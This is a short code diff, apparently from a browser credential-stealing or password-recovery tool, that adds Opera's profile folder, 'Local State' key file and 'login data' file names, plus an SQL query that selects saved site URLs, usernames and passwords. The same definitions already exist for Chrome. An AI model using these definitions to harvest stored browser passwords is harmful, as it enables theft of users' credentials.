@@ -44,3 +44,8 @@
 #define CHROME_CONFIG_FILE L"Local State"
 #define CHROME_FOLDER L"\\Google\\Chrome\\User Data"
 #define CHROME_SQL_QUERY "SELECT action_url, username_value, password_value FROM logins"
+
+#define OPERA_FILES_SEARCH L"login data"
+#define OPERA_CONFIG_FILE L"Local State"
+#define OPERA_FOLDER L"\\Opera Software\\Opera Stable"
+#define OPERA_SQL_QUERY "SELECT action_url, username_value, password_value FROM logins"
